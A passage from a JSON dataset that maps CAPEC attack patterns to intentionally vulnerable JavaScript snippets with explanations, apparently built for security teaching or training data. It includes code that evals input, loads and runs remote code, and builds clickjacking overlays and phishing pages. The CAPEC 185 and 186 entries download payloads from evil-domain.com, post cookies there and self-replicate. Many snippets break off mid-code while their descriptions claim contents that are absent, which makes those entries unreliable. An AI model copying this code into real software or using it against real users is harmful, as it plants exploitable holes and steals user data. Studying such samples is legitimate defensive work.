        "description": "This code demonstrates a vulnerable authentication mechanism that relies on easily spoofable IP addresses and static tokens. It trusts the X-Forwarded-For header (which can be manipulated) and uses a static list of trusted IPs without proper identity verification. The authentication can be bypassed by spoofing IP addresses or headers, and the static token provides no protection against replay attacks."
    },
    {
        "capec_id": "153",
        "capec_name": "Input Data Manipulation",
        "code_snippet": "function processUserData(userData) {\n    // Directly using raw input without validation\n    let userType = userData.type;\n    let userRole = userData.role;\n    \n    // Vulnerable authorization check based on untrusted input\n    if(userType === 'admin') {\n        // Grant admin privileges\n        grantAdminAccess(userData);\n    }\n    \n    // Process structured data without format validation\n    let parsedData = eval('(' + userData.data + ')');\n    \n    // Execute commands based on unvalidated input\n    if(userRole === 'operator') {\n        executeCommand(userData.command);\n    }\n    \n    return parsedData;\n}",
        "description": "This code accepts user input without proper validation, demonstrating multiple vulnerabilities: it doesn't validate input types, trusts user-provided role information for security decisions, uses eval() on unvalidated data, and executes commands without syntactic validation. The code fails to implement any input validation framework and processes potentially malicious input directly."
    },
    {
        "capec_id": "154",
        "capec_name": "Resource Location Spoofing",
        "code_snippet": "`\n    // Vulnerable login form with spoofable endpoint\n    function loginUser() {\n      const username = document.getElementById('username').value;\n      const password = document.getElementById('password').value;\n      const loginEndpoint = document.getElementById('endpoint').value || 'https://legitimate-server.com/auth';\n      \n      // No validation of endpoint origin\n      fetch(loginEndpoint, {\n        method: 'POST',\n        body: JSON.stringify({ username, password",
        "description": "\"This code demonstrates vulnerability to endpoint spoofing by allowing the authentication endpoint to be manipulated through a hidden form field. It lacks proper origin validation and blindly trusts the response redirect URL. An attacker could modify the endpoint to point to a malicious server, capturing credentials and redirecting users to a spoofed site.\""
    },
    {
        "capec_id": "155",
        "capec_name": "Screen Temporary Files for Sensitive Information",
        "code_snippet": "const fs = require('fs');\nconst os = require('os');\n\nfunction processUserData(userData) {\n    // Write sensitive data to temp file with insecure permissions\n    const tempFile = os.tmpdir() + '/user_data_' + Date.now() + '.tmp';\n    fs.writeFileSync(tempFile, JSON.stringify(userData), { mode: 0o666 });\n\n    // Cache sensitive information in public directory\n    const webCache = './public/cache/';\n    if (!fs.existsSync(webCache)) {\n        fs.mkdirSync(webCache, { recursive: true });\n    }\n    fs.writeFileSync(webCache + 'user_cache.json', JSON.stringify({\n        creditCard: userData.ccNumber,\n        ssn: userData.ssn,\n        lastAccessed: new Date().toISOString()\n    }));\n\n    // Process data\n    // ... processing logic ...\n\n    // Attempt to cleanup but file might still be accessible\n    fs.unlinkSync(tempFile);\n}",
        "description": "This code creates temporary files with sensitive user data using insecure permissions (0o666) in the system temp directory and caches sensitive information in a public web-accessible directory. The code demonstrates multiple vulnerabilities including insecure temporary file creation, improper cache storage of sensitive data, and storage of sensitive files in web-accessible locations."
    },
    {
        "capec_id": "157",
        "capec_name": "Sniffing Attacks",
        "code_snippet": "`\nconst socket = new WebSocket('ws://unsecure-server.com');\nconst login = {\n  username: 'admin',\n  password: 'secretpass123',\n  creditCard: '4111-1111-1111-1111'",
        "description": "\"This code demonstrates multiple vulnerabilities related to sniffing attacks. It transmits sensitive data (login credentials, credit card, SSN) in cleartext over unsecured WebSocket and HTTP connections, making it susceptible to network sniffing. The periodic transmission creates predictable patterns that could be exploited through side-channel analysis. The code lacks encryption, message integrity checks, and secure transport protocols.\""
    },
    {
        "capec_id": "158",
        "capec_name": "Sniffing Network Traffic",
        "code_snippet": "`\n// Insecure login system that transmits credentials in cleartext\nconst net = require('net');\n\nconst server = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    const credentials = data.toString();\n    const [username, password] = credentials.split(':');\n    \n    if (authenticateUser(username, password)) {\n      socket.write('SESSION=' + createSessionToken(username));\n      \n      // Send sensitive system info without encryption\n      const systemInfo = {\n        dbConnection: 'mongodb://admin:pass123@localhost:27017',\n        apiKeys: ['key1', 'key2'],\n        serverConfig: process.env",
        "description": "\"This code demonstrates multiple vulnerabilities related to network sniffing. It transmits login credentials and sensitive system information in cleartext over a TCP connection, lacks encryption for data transmission, and implements a basic authentication system susceptible to capture-replay attacks. The server also exposes sensitive system configuration and credentials without proper access controls.\""
    },
    {
        "capec_id": "159",
        "capec_name": "Redirect Access to Libraries",
        "code_snippet": "const loadLibrary = (libraryName) => {\n  const libPath = process.env.LIB_PATH || './lib';\n  const fullPath = libPath + '/' + libraryName;\n  \n  try {\n    const library = require(fullPath);\n    return library;\n  } catch (err) {\n    // Fallback to alternate paths if library not found\n    const alternatePaths = [\n      './backup/lib',\n      '../shared/lib',\n      process.env.ALTERNATE_PATH\n    ];\n    \n    for (const path of alternatePaths) {\n      try {\n        const library = require(path + '/' + libraryName);\n        return library;\n      } catch {}\n    }\n  }\n};\n\n// Usage\nconst cryptoLib = loadLibrary('crypto-utils.js');\ncryptoLib.encrypt('sensitive data');",
        "description": "This code demonstrates a vulnerable library loading mechanism that searches multiple paths to locate and load external libraries. The code accepts unvalidated paths from environment variables and uses a fallback mechanism that searches various directories, making it susceptible to library hijacking. An attacker could manipulate the LIB_PATH or ALTERNATE_PATH environment variables, or place malicious libraries in the searched paths to execute arbitrary code."
    },
    {
        "capec_id": "160",
        "capec_name": "Exploit Script-Based APIs",
        "code_snippet": "function displayUserProfile(userInput) {\n    const template = `\n        <div class='profile'>\n            <h2>${userInput.name}</h2>\n            <script>const userData = ${JSON.stringify(userInput)};\n            document.write('Welcome ' + userData.name);</script>\n            <div class='bio'>${userInput.bio}</div>\n        </div>\n    `;\n    document.getElementById('profileContainer').innerHTML = template;\n}",
        "description": "This code demonstrates vulnerable template processing and cross-site scripting by directly inserting unvalidated user input into HTML templates, including a script tag. It allows arbitrary JavaScript execution through user-controlled data without proper sanitization."
    },
    {
        "capec_id": "161",
        "capec_name": "Infrastructure Manipulation",
        "code_snippet": "`\nconst net = require('net');\nconst server = net.createServer();\n\nconst forwardingRules = {\n    'bank.com': '10.0.0.99' // Attacker's IP",
        "description": "\"A vulnerable proxy server that redirects network traffic by manipulating routing rules without proper endpoint validation, message integrity checks, or destination verification. It allows traffic intended for legitimate destinations to be redirected to potentially malicious endpoints, demonstrating network infrastructure manipulation for pharming attacks.\""
    },
    {
        "capec_id": "162",
        "capec_name": "Manipulating Hidden Fields",
        "code_snippet": "// Server-side code\napp.post('/process-payment', (req, res) => {\n    // Blindly trust price data from client\n    const itemPrice = req.body.price;\n    const quantity = req.body.quantity;\n    const totalAmount = itemPrice * quantity;\n    \n    // Process payment without validation\n    processPayment({\n        userId: req.body.userId,\n        amount: totalAmount,\n        orderId: req.body.orderId\n    });\n});\n\n// Client-side form\n<form action=\"/process-payment\" method=\"POST\">\n    <input type=\"hidden\" name=\"price\" value=\"99.99\">\n    <input type=\"hidden\" name=\"quantity\" value=\"1\">\n    <input type=\"hidden\" name=\"orderId\" value=\"12345\">\n    <button type=\"submit\">Complete Purchase</button>\n</form>",
        "description": "A vulnerable e-commerce implementation that relies on client-side price information stored in hidden form fields. The server processes payment based on client-provided values without server-side validation, allowing price manipulation through HTML form modification."
    },
    {
        "capec_id": "163",
        "capec_name": "Spear Phishing",
        "code_snippet": "function createTrustedEmailUI() {\n  const emailContent = {\n    from: 'security@trusted-bank.com',\n    signature: 'valid-digital-signature',\n    userInfo: {\n      name: 'John Smith',\n      company: 'Tech Corp',\n      recentTransaction: '$2,459.00'\n    }\n  };\n\n  function createRedirectLink() {\n    const redirectUrl = 'https://legitimate-bank.com/verify';\n    const maliciousUrl = 'https://malicious-site.com/phish';\n    return `${redirectUrl}?redirect=${encodeURIComponent(maliciousUrl)}`;\n  }\n\n  const emailTemplate = `\n    <div class='trusted-email'>\n      <div class='header'>${emailContent.from}</div>\n      <div class='body'>\n        Dear ${emailContent.userInfo.name},\n        We noticed a suspicious transaction of ${emailContent.userInfo.recentTransaction}\n        Please verify your account: <a href='${createRedirectLink()}' target='_blank'>Secure Link</a>\n      </div>\n      <div class='signature'>${emailContent.signature}</div>\n    </div>\n  `;\n\n  document.getElementById('email-container').innerHTML = emailTemplate;\n  window.opener = { location: 'https://trusted-bank.com' };\n}",
        "description": "This code demonstrates a spear phishing attack by creating a deceptive email interface that appears to come from a trusted bank. It includes personal information to increase credibility, implements an open redirect vulnerability, and manipulates the window.opener object. The code misrepresents critical UI elements and uses untrusted domains in redirects."
    },
    {
        "capec_id": "164",
        "capec_name": "Mobile Phishing",
        "code_snippet": "`\n    // Simulated vulnerable mobile authentication system\n    function mobileLogin(phoneNumber, password) {\n      let failedAttempts = 0;\n      \n      function sendSMSPhishingLink(phone) {\n        const fakeLoginURL = 'https.secure-bank-login.evil.com';\n        const phishingMessage = 'Security Alert: Your account has been locked. '\\\n          + 'Click here to verify your identity: ' + fakeLoginURL;\n        sendSMS(phone, phishingMessage);",
        "description": "\"This code demonstrates a vulnerable mobile authentication system that includes multiple security flaws: it implements single-factor authentication, lacks protection against brute force attempts, uses SMS-based phishing, presents misleading UI elements, and has no proper domain validation. The system sends phishing SMS messages and creates a deceptive login interface that can be used to harvest credentials.\""
    },
    {
        "capec_id": "165",
        "capec_name": "File Manipulation",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction processUploadedFile(userFilename, content) {\n    let filepath = './uploads/' + userFilename;\n    \n    // Write content to temporary file\n    fs.writeFileSync(filepath, content);\n    \n    // Process file based on extension\n    if (filepath.endsWith('.txt')) {\n        return fs.readFileSync(filepath, 'utf8');\n    } else if (filepath.endsWith('.exe')) {\n        require('child_process').execSync(filepath);\n    }\n    \n    // Clean up\n    fs.unlinkSync(filepath);\n}",
        "description": "This vulnerable code demonstrates multiple file manipulation issues: it allows direct control of file paths through user input, relies on file extensions for processing decisions, creates insecure temporary files, and lacks path traversal protection. The code blindly trusts user-supplied filenames and executes files based on extensions, potentially allowing attackers to execute arbitrary code or access sensitive files outside the intended directory."
    },
    {
        "capec_id": "166",
        "capec_name": "Force the System to Reset Values",
        "code_snippet": "class DeviceManager {\n    constructor() {\n        this.secureMode = true;\n        this.configLocked = true;\n        this.sensitiveData = 'secret';\n    }\n\n    powerSaveMode() {\n        // Transition to power save mode without preserving security state\n        this.secureMode = false;\n        this.configLocked = false;\n    }\n\n    restoreFromPowerSave() {\n        // Restore from power save without re-establishing security settings\n        return {\n            config: this.getConfiguration(),\n            data: this.sensitiveData\n        };\n    }\n\n    getConfiguration() {\n        // No authentication check before accessing critical configuration\n        if (!this.configLocked) {\n            return {\n                settings: 'sensitive_system_settings',\n                credentials: 'stored_credentials'\n            };\n        }\n    }\n\n    resetDevice() {\n        // Reset without initializing security settings\n        this.secureMode = undefined;\n        this.configLocked = false;\n        return this.getConfiguration();\n    }\n}",
        "description": "This vulnerable code demonstrates a device management system that fails to properly maintain security states during power transitions and resets. It allows unauthorized access to critical configurations through power state manipulation and improper reset handling, lacking proper authentication and security state preservation."
    },
    {
        "capec_id": "167",
        "capec_name": "White Box Reverse Engineering",
        "code_snippet": "function processUserData(userData) {\n    // Debug mode can be activated at runtime\n    const DEBUG_MODE = true;\n    \n    // Sensitive trace data stored in global object\n    window._debugTrace = [];\n    \n    // System information exposed through debug functions\n    function getSystemInfo() {\n        return {\n            platform: navigator.platform,\n            userAgent: navigator.userAgent,\n            memory: performance.memory,\n            credentials: localStorage.getItem('credentials')\n        };\n    }\n    \n    if (DEBUG_MODE) {\n        // Collecting trace data\n        window._debugTrace.push({\n            timestamp: Date.now(),\n            data: userData,\n            systemInfo: getSystemInfo()\n        });\n        \n        // Debug backdoor\n        window.eval('debugger; console.log(window._debugTrace);');\n    }\n    \n    return processData(userData);\n}",
        "description": "This vulnerable code demonstrates white box analysis exposure by implementing debug functionality that can be activated at runtime, storing sensitive trace data in a global object, exposing system information, and including a debug backdoor using eval. The code allows for observation and analysis of internal operations, potentially exposing sensitive data and system information to attackers."
    },
    {
        "capec_id": "168",
        "capec_name": "Windows ::DATA Alternate Data Stream",
        "code_snippet": "`\nconst fs = require('fs');\nconst path = require('path');\n\nfunction storeSecretData(filename, sensitiveData) {\n    // Store sensitive data in main file\n    fs.writeFileSync(filename, 'Regular content');\n    \n    // Hide sensitive data in alternate data stream\n    const adsPath = filename + ':secret.txt';\n    const command = `type ${sensitiveData",
        "description": "\"This code demonstrates vulnerable handling of NTFS Alternate Data Streams by storing sensitive data in hidden ADS streams, using insecure file path handling, and not properly validating file types or junctions. It fails to properly clean sensitive data and doesn't implement proper checks for ADS access or detection.\""
    },
    {
        "capec_id": "169",
        "capec_name": "Footprinting",
        "code_snippet": "`\nconst adminUsers = ['admin', 'superuser'];\nconst sensitiveData = {\n  'admin': { key: '12345', permissions: 'full'",
        "description": "\"This code demonstrates multiple information disclosure vulnerabilities through verbose error messages, timing differences in processing admin vs regular users, and inclusion of debug information in responses. These behaviors allow system probing and information gathering about internal structure and user accounts.\""
    },
    {
        "capec_id": "170",
        "capec_name": "Web Application Fingerprinting",
        "code_snippet": "`\nconst express = require('express');\nconst app = express();\n\napp.get('/api/user', (req, res) => {\n    try {\n        // Sensitive information in query string\n        const userId = req.query.ssn;\n        const password = req.query.password;\n        \n        // Detailed error messages exposing system info\n        if (!userId || !password) {\n            res.status(400).send({\n                error: 'Missing credentials',\n                server: process.version,\n                os: process.platform,\n                path: __dirname,\n                stack: new Error().stack",
        "description": "\"This code demonstrates multiple vulnerabilities related to system information exposure and fingerprinting. It includes sensitive data in query strings, reveals detailed error messages with system information, exposes server details through headers, and allows unsafe dynamic code execution. The error handling reveals internal system details, making it easier for attackers to fingerprint the application and its infrastructure.\""
    },
    {
        "capec_id": "171",
        "capec_name": "DEPRECATED: Variable Manipulation",
        "code_snippet": "function processUserInput(userInput) {\n    var dynamicVarName = 'user_' + userInput;\n    var dataObject = {};\n    \n    // Vulnerable dynamic variable evaluation\n    eval(dynamicVarName + ' = \"sensitive_data\"');\n    \n    // Vulnerable dynamic property access\n    dataObject[userInput] = 'some_value';\n    \n    // Vulnerable dynamic function execution\n    window[userInput + '_handler']();\n}",
        "description": "This code demonstrates vulnerable handling of user-controlled variables through dynamic evaluation, including unsafe use of eval(), dynamic property access, and dynamic function execution based on user input without proper validation or sanitization."
    },
    {
        "capec_id": "173",
        "capec_name": "Action Spoofing",
        "code_snippet": "function createDeceptiveButton() {\n    const overlay = document.createElement('div');\n    overlay.style.position = 'fixed';\n    overlay.style.top = '0';\n    overlay.style.left = '0';\n    overlay.style.width = '100%';\n    overlay.style.height = '100%';\n    overlay.style.zIndex = '9999';\n    overlay.style.opacity = '0';\n\n    const button = document.createElement('button');\n    button.innerHTML = 'Click to View Results';\n    button.style.position = 'relative';\n    button.style.zIndex = '1';\n\n    overlay.onclick = function() {\n        const hiddenForm = document.createElement('form');\n        hiddenForm.action = 'http://malicious-site.com/download';\n        hiddenForm.method = 'POST';\n        document.body.appendChild(hiddenForm);\n        hiddenForm.submit();\n    };\n\n    document.body.appendChild(overlay);\n    document.body.appendChild(button);\n}",
        "description": "This code creates a deceptive UI element where a visible button appears to show results, but an invisible overlay actually triggers a hidden form submission to download content from a malicious site. It implements UI misrepresentation (CWE-451) and spoofing (CWE-290) by making users believe they're performing one action while actually executing another."
    },
    {
        "capec_id": "174",
        "capec_name": "Flash Parameter Injection",
        "code_snippet": "function loadFlashContent(userInput) {\n    var flashVars = {\n        allowScriptAccess: 'always',\n        allowNetworking: 'all',\n        moviePath: userInput.path,\n        callback: 'parent.document.location=\"' + userInput.callback + '\"'\n    };\n    \n    var embedHTML = '<object type=\"application/x-shockwave-flash\" data=\"' + \n        userInput.swfFile + '\">' +\n        '<param name=\"flashvars\" value=\"' + \n        encodeURIComponent(JSON.stringify(flashVars)) + '\" />' +\n        '<param name=\"allowScriptAccess\" value=\"always\" />' +\n        '</object>';\n    \n    document.getElementById('flashContainer').innerHTML = embedHTML;\n}",
        "description": "Vulnerable Flash embedding code that accepts unvalidated user input and injects it directly into Flash parameters, allowing for cross-domain scripting and potential command injection through flashvars. The code also grants unrestricted script access and networking capabilities to the Flash content."
    },
    {
        "capec_id": "175",
        "capec_name": "Code Inclusion",
        "code_snippet": "const userScript = process.env.USER_SCRIPT || 'default.js';\nconst scriptPath = `./scripts/${userScript}`;\n\ntry {\n    const script = require(scriptPath);\n    script.execute(userInput);\n} catch(err) {\n    // Fallback to remote script if local fails\n    const http = require('http');\n    http.get(`http://external-domain.com/scripts/${userScript}`, (res) => {\n        let data = '';\n        res.on('data', (chunk) => { data += chunk; });\n        res.on('end', () => {\n            eval(data);\n        });\n    });\n}",
        "description": "This code demonstrates unsafe dynamic code inclusion by loading JavaScript files based on user input without proper validation. It attempts to load a local script first, then falls back to downloading and executing remote code if the local load fails, creating multiple vectors for arbitrary code execution."
    },
    {
        "capec_id": "176",
        "capec_name": "Configuration/Environment Manipulation",
        "code_snippet": "const fs = require('fs');\nconst configPath = './app_config.json';\n\nclass ApplicationConfig {\n    constructor() {\n        this.config = this.loadConfig();\n    }\n\n    loadConfig() {\n        try {\n            return JSON.parse(fs.readFileSync(configPath, 'utf8'));\n        } catch (error) {\n            return {};\n        }\n    }\n\n    updateSetting(key, value) {\n        this.config[key] = value;\n        fs.writeFileSync(configPath, JSON.stringify(this.config));\n    }\n\n    getSetting(key) {\n        return this.config[key];\n    }\n}\n\nconst appConfig = new ApplicationConfig();\nappConfig.updateSetting('securityLevel', 'low');\nappConfig.updateSetting('debugMode', true);",
        "description": "This vulnerable code demonstrates external configuration manipulation by allowing direct modification of application settings through an unprotected configuration file. The code lacks proper validation, access controls, and integrity checks when reading from or writing to the configuration file. It also enables debug mode settings without verification, making it susceptible to configuration/environment manipulation attacks."
    },
    {
        "capec_id": "177",
        "capec_name": "Create files with the same name as files protected with a higher classification",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction loadLibrary(libraryName) {\n    const searchPaths = [\n        './user_libs/',\n        './system_libs/',\n        './libs/'\n    ];\n\n    for (const searchPath of searchPaths) {\n        const libPath = path.join(searchPath, libraryName);\n        if (fs.existsSync(libPath)) {\n            const library = require(libPath);\n            return library;\n        }\n    }\n    throw new Error('Library not found');\n}",
        "description": "This code implements an insecure library loading mechanism that searches multiple directories for a library file based on name alone. It's vulnerable to file search path manipulation as it checks user-controlled directories first before system directories, allowing an attacker to place malicious libraries that will be loaded instead of legitimate ones. The code doesn't validate the actual path or implement any file integrity checks."
    },
    {
        "capec_id": "178",
        "capec_name": "Cross-Site Flashing",
        "code_snippet": "const flashPlayer = {\n    loadMovie: function(url) {\n        // Vulnerable function that loads external Flash content without validation\n        let swfUrl = new URL(url);\n        let params = swfUrl.searchParams;\n        let externalSource = params.get('source') || '';\n        \n        // No validation of external source\n        let flashContainer = document.createElement('object');\n        flashContainer.setAttribute('data', externalSource);\n        flashContainer.setAttribute('type', 'application/x-shockwave-flash');\n        \n        // Vulnerable crossdomain policy\n        let allowScript = document.createElement('param');\n        allowScript.setAttribute('name', 'allowScriptAccess');\n        allowScript.setAttribute('value', 'always');\n        \n        flashContainer.appendChild(allowScript);\n        document.body.appendChild(flashContainer);\n        \n        // Open link in new window with opener access\n        window.open(externalSource, '_blank');\n    }\n};",
        "description": "This code demonstrates a vulnerable Flash content loader that accepts unvalidated URLs and external sources, implements permissive cross-domain policies, and creates potentially dangerous window.opener relationships. The code fails to properly validate external URLs, allows unrestricted script access, and enables cross-domain interactions without proper security controls."
    },
    {
        "capec_id": "179",
        "capec_name": "Calling Micro-Services Directly",
        "code_snippet": "// Frontend microservice discovery and interaction\nconst microserviceEndpoints = {\n    userdata: '/api/users/data?token=sensitive_token',\n    payments: '/api/payments/process?apiKey=12345',\n    settings: '/api/settings/all'\n};\n\nfunction discoverServices() {\n    let serviceData = {};\n    for (let service in microserviceEndpoints) {\n        fetch(microserviceEndpoints[service], {\n            method: 'GET',\n            credentials: 'include'\n        })\n        .then(response => response.json())\n        .then(data => {\n            document.cookie = `${service}_data=${JSON.stringify(data)}; expires=Thu, 31 Dec 2025 23:59:59 UTC; path=/`;\n            serviceData[service] = data;\n            updateServiceUI(service, data);\n        });\n    }\n    localStorage.setItem('serviceConfig', JSON.stringify(microserviceEndpoints));\n}\n\nfunction updateServiceUI(service, data) {\n    const serviceDiv = document.createElement('div');\n    serviceDiv.innerHTML = data;\n    document.getElementById('services-root').appendChild(serviceDiv);\n}",
        "description": "This vulnerable code demonstrates exposing microservice endpoints through client-side JavaScript, storing sensitive configuration in localStorage, using GET requests with sensitive parameters, storing sensitive data in persistent cookies, and implementing security checks solely on the client side. The code makes service endpoints discoverable and queryable, stores sensitive data under web root, and uses unsafe storage methods for sensitive information."
    },
    {
        "capec_id": "180",
        "capec_name": "Exploiting Incorrectly Configured Access Control Security Levels",
        "code_snippet": "// Configuration for access control\nconst accessConfig = {\n  admin: { role: 'admin', permissions: ['read', 'write', 'execute'] },\n  user: { role: 'user', permissions: ['read'] }\n};\n\nclass ResourceManager {\n  constructor() {\n    this.resources = new Map();\n    this.currentUser = null;\n  }\n\n  initializeResource(resourceId, data) {\n    // Vulnerable: No validation of user permissions before initialization\n    this.resources.set(resourceId, { data, permissions: '*' });\n  }\n\n  accessResource(resourceId, operation) {\n    const resource = this.resources.get(resourceId);\n    // Vulnerable: Insufficient permission check\n    if (resource.permissions === '*') {\n      return resource.data;\n    }\n    // Vulnerable: Access check performed after accessing the data\n    const data = resource.data;\n    if (this.currentUser && accessConfig[this.currentUser].permissions.includes(operation)) {\n      return data;\n    }\n  }\n\n  setResourceAccess(resourceId, permissions) {\n    // Vulnerable: No validation of permission modification\n    if (this.resources.has(resourceId)) {\n      this.resources.get(resourceId).permissions = permissions;\n    }\n  }\n}",
        "description": "This code demonstrates vulnerable access control implementation where permissions are insufficiently checked, resources are accessed before permission validation, and there's no proper validation when modifying access controls. The code allows unauthorized access to resources through multiple vectors including incorrect permission assignment and access control checks occurring after resource access."
    },
    {
        "capec_id": "181",
        "capec_name": "Flash File Overlay",
        "code_snippet": "// Malicious Flash overlay code\nfunction createOverlay() {\n    var overlay = document.createElement('object');\n    overlay.setAttribute('type', 'application/x-shockwave-flash');\n    overlay.setAttribute('data', 'malicious.swf');\n    overlay.style.position = 'fixed';\n    overlay.style.top = '0';\n    overlay.style.left = '0';\n    overlay.style.width = '100%';\n    overlay.style.height = '100%';\n    overlay.style.opacity = '0.001';\n    overlay.style.zIndex = '999999';\n\n    var param = document.createElement('param');\n    param.setAttribute('name', 'wmode');\n    param.setAttribute('value', 'transparent');\n    overlay.appendChild(param);\n\n    document.body.appendChild(overlay);\n}\n\n// Crossdomain.xml configuration\nvar crossdomain = '<?xml version=\"1.0\"?>' +\n    '<cross-domain-policy>' +\n    '<allow-access-from domain=\"*\" />' +\n    '</cross-domain-policy>';\n\n// Execute when page loads\nwindow.onload = createOverlay;",
        "description": "This code creates a transparent Flash overlay that covers the entire webpage, enabling clickjacking attacks by intercepting user clicks. The overlay is positioned absolutely with maximum z-index and near-invisible opacity. It includes a permissive cross-domain policy that allows access from any domain, making it more vulnerable to attacks. The Flash object can intercept and redirect user interactions to malicious targets."
    },
    {
        "capec_id": "182",
        "capec_name": "Flash Injection",
        "code_snippet": "// Flash Embed with vulnerable crossdomain policy\nfunction loadFlashContent(userInput) {\n    let flashObj = document.createElement('object');\n    flashObj.setAttribute('type', 'application/x-shockwave-flash');\n    flashObj.setAttribute('data', userInput); // Unvalidated user input\n    \n    let param = document.createElement('param');\n    param.setAttribute('name', 'allowScriptAccess');\n    param.setAttribute('value', 'always'); // Permissive access\n    \n    let crossdomain = '<?xml version=\"1.0\"?>' +\n        '<cross-domain-policy>' +\n        '<allow-access-from domain=\"*\" />' + // Allows all domains\n        '</cross-domain-policy>';\n    \n    flashObj.appendChild(param);\n    document.body.appendChild(flashObj);\n}",
        "description": "This code demonstrates a vulnerable Flash content loader that accepts unvalidated user input for the Flash object's source, combined with a permissive cross-domain policy that allows access from any domain. The code lacks input validation, uses an overly permissive security policy, and could allow an attacker to inject malicious Flash content that executes arbitrary commands."
    },
    {
        "capec_id": "183",
        "capec_name": "IMAP/SMTP Command Injection",
        "code_snippet": "`\nconst express = require('express');\nconst { exec",
        "description": "\"This vulnerable code demonstrates an IMAP/SMTP command injection by directly concatenating user input into a shell command without sanitization. It exposes sensitive error messages and relies on client-side input with no server-side validation, allowing attackers to inject arbitrary IMAP commands that will be executed on the mail server.\""
    },
    {
        "capec_id": "184",
        "capec_name": "Software Integrity Attack",
        "code_snippet": "function loadAndExecuteRemoteScript(url) {\n  fetch(url)\n    .then(response => response.text())\n    .then(code => {\n      const script = document.createElement('script');\n      script.innerHTML = code;\n      document.head.appendChild(script);\n\n      // Expose system info to remote script\n      window.systemInfo = {\n        platform: navigator.platform,\n        userAgent: navigator.userAgent,\n        language: navigator.language,\n        deviceMemory: navigator.deviceMemory,\n        hardwareConcurrency: navigator.hardwareConcurrency\n      };\n\n      // Malicious code to modify runtime behavior\n      const originalFetch = window.fetch;\n      window.fetch = function(url, options) {\n        // Intercept and modify requests\n        if (url.includes('security')) {\n          url = 'https://malicious-server.com/intercepted';\n        }\n        return originalFetch(url, options);\n      };\n    });\n}",
        "description": "This code demonstrates downloading and executing remote code without integrity checks, exposing sensitive system information, and modifying runtime behavior through function hijacking. It downloads arbitrary JavaScript from a URL and executes it without verification, exposes system details to the downloaded code, and includes functionality to intercept and modify network requests."
    },
    {
        "capec_id": "185",
        "capec_name": "Malicious Software Download",
        "code_snippet": "function downloadAndExecute() {\n    const maliciousUrl = 'http://evil-domain.com/payload.js';\n    fetch(maliciousUrl)\n        .then(response => response.text())\n        .then(code => {\n            const systemInfo = {\n                platform: navigator.platform,\n                userAgent: navigator.userAgent,\n                language: navigator.language,\n                cookies: document.cookie\n            };\n            \n            // Send system info to attacker\n            fetch('http://evil-domain.com/collect', {\n                method: 'POST',\n                body: JSON.stringify(systemInfo)\n            });\n            \n            // Execute downloaded code without verification\n            eval(code);\n            \n            // Replicate to other endpoints\n            document.querySelectorAll('a').forEach(link => {\n                fetch(link.href + '?inject=' + encodeURIComponent(code));\n            });\n        });\n}",
        "description": "Malicious code that downloads and executes unverified JavaScript from an attacker-controlled domain, harvests sensitive system information, and attempts to self-replicate by injecting itself into other endpoints. The code appears benign but contains hidden functionality to compromise system security."
    },
    {
        "capec_id": "186",
        "capec_name": "Malicious Software Update",
        "code_snippet": "function checkForUpdates() {\n    const updateServer = 'http://malicious-update-server.com/updates';\n    fetch(updateServer)\n        .then(response => response.json())\n        .then(data => {\n            if(data.hasUpdate) {\n                // Download and execute update without verification\n                const script = document.createElement('script');\n                script.src = data.updateUrl;\n                document.head.appendChild(script);\n                \n                // Hidden malicious payload\n                const payload = atob(data.payload);\n                eval(payload);\n                \n                // Replicate to other systems\n                const contacts = getAllContacts();\n                contacts.forEach(contact => {\n                    sendMaliciousUpdate(contact, payload);\n                });\n            }\n        });\n}\nsetInterval(checkForUpdates, 3600000);",
        "description": "A vulnerable auto-update implementation that downloads and executes code from an untrusted source without integrity verification. It contains hidden malicious code that self-replicates and includes a trojan payload that executes arbitrary code received from the attacker's server."
    },
    {
        "capec_id": "187",
        "capec_name": "Malicious Automated Software Update via Redirection",
        "code_snippet": "// Auto-update client implementation\nclass UpdateClient {\n    constructor(serverUrl) {\n        this.serverUrl = serverUrl;\n        this.lastUpdate = null;\n    }\n\n    async checkForUpdates() {\n        try {\n            const response = await fetch(this.serverUrl + '/updates');\n            const update = await response.json();\n            \n            if(this.lastUpdate !== update.version) {\n                // Download and execute update without proper verification\n                const codeResponse = await fetch(update.codeUrl);\n                const newCode = await codeResponse.text();\n                \n                // Dangerous: No integrity check, just execute downloaded code\n                eval(newCode);\n                \n                this.lastUpdate = update.version;\n                localStorage.setItem('updateToken', update.token);\n            }\n        } catch(e) {\n            console.error('Update failed:', e);\n        }\n    }\n\n    authenticate() {\n        // Weak authentication using only a stored token\n        return localStorage.getItem('updateToken');\n    }\n}",
        "description": "This vulnerable code implements an auto-update mechanism that fails to properly authenticate the update server and doesn't validate the integrity of downloaded code. It blindly trusts the server response and executes downloaded code using eval(). The authentication relies solely on client-side token storage, making it susceptible to capture-replay attacks. The code demonstrates multiple security issues including download without integrity checks (CWE-494), authentication bypass (CWE-294), client-side security enforcement (CWE-602), and potential execution of malicious code (CWE-506)."
    },
    {
        "capec_id": "188",
        "capec_name": "Reverse Engineering",
        "code_snippet": "class SecureDevice {\n    constructor(key) {\n        this.secretKey = key;\n        this.debugMode = false;\n    }\n\n    // Weak encryption using simple XOR\n    encrypt(data) {\n        let result = '';\n        for(let i = 0; i < data.length; i++) {\n            result += String.fromCharCode(data.charCodeAt(i) ^ this.secretKey.charCodeAt(i % this.secretKey.length));\n        }\n        return btoa(result);\n    }\n\n    // Undocumented debug feature\n    enableDebugMode() {\n        this.debugMode = true;\n        return {\n            deviceInfo: process.env,\n            systemConfig: require('os').cpus(),\n            secretKey: this.secretKey\n        };\n    }\n\n    // Critical security function that might be optimized out\n    verifyAccess() {\n        if(this.debugMode) {\n            return true;\n        }\n        // Complex check that might be optimized\n        let check = 0;\n        for(let i = 0; i < 1000; i++) {\n            check += i % 2;\n        }\n        return check === 500;\n    }\n}",
        "description": "This code demonstrates vulnerable hardware/software reverse engineering protection through weak encryption (XOR), exposure of system information via debug mode, undocumented features, security-critical code that might be optimized out, and usage of unsafe cryptographic methods. The code includes system information exposure and debug features that could aid in reverse engineering."
    },
    {
        "capec_id": "189",
        "capec_name": "Black Box Reverse Engineering",
        "code_snippet": "`\nconst checkPassword = (input) => {\n  const storedPassword = 'SecretPassword123';\n  let isValid = true;\n\n  for (let i = 0; i < storedPassword.length; i++) {\n    if (input[i] !== storedPassword[i]) {\n      isValid = false;\n      // Timing attack vulnerability: function returns immediately on first mismatch\n      return false;",
